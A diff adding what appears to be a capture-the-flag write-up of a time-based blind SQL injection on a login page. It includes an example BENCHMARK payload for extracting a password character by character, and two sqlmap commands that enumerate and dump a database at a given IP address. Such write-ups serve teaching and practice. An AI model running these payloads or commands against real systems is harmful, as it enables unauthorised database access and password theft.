@@ -1,3 +1,18 @@
+The exploit was a Time-based Blind SQL injection on the login page.
+Details about Blind SQL injection:
+    - https://owasp.org/www-community/attacks/Blind_SQL_Injection
+    - https://portswigger.net/web-security/sql-injection/blind
+
+This type of blind SQL injection relies on the database pausing for a specified amount of time, then returning the results, indicating successful SQL query executing. Using this method, an attacker enumerates each letter of the desired piece of data using the following logic:
+If the first letter of the first database’s name is an ‘A’, wait for 10 seconds.
+If the first letter of the first database’s name is an ‘B’, wait for 10 seconds. etc.
+Example: 1 UNION SELECT IF(SUBSTRING(user_password,1,1) = CHAR(50),BENCHMARK(5000000,ENCODE('MSG','by 5 seconds')),null) FROM users WHERE user_id = 1;
+If the database response took a long time, we may expect that the first user password character with user_id = 1 is character ‘2’. (CHAR(50) == '2')
+Using this method for the rest of characters, it’s possible to enumerate entire passwords stored in the database. This method works even when the attacker injects the SQL queries and the content of the vulnerable page doesn’t change.
+
+-------------------------------------------
+I used sqlmap to test for SQL injections:
+
 sqlmap -u http://206.189.100.213/login --data="username=user&password=pass" --method POST --dbs --batch
 
 sqlmap -u http://206.189.100.213/login --data="username=user&password=pass" --method POST -D ctf --dump all --batch
